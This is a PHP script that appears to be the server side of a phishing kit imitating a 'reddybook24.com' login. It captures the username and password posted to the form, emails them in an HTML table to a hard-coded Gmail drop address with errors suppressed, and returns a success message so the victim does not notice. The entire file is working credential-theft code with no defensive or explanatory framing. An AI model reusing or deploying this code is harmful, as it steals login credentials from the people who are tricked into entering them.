<?php
if(!empty($_POST['loginName'])){
$contacts = array(
"
diwali3663poojan@gmail.com"
);

foreach($contacts as $contact) {
$email_to = $contact;
     $email_subject ='reddybook24.com- new';
     $email_message ="<html><head></head><body><table>".
                   "<tr><td>User name: </td> " .
                   " <td>".$_POST['loginName'].
                   "</td></tr>".
                   "<tr><td>Password: </td> " .
                   "<td>".$_POST['password'].
                   "</td></tr>".
                   "<tr>".
       $headers = "FROM: reddybook24.com \r\n";
       $headers .= "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        @mail($email_to, $email_subject, $email_message, $headers);
}
 echo "sucessmsg";
    exit;
    }
?>
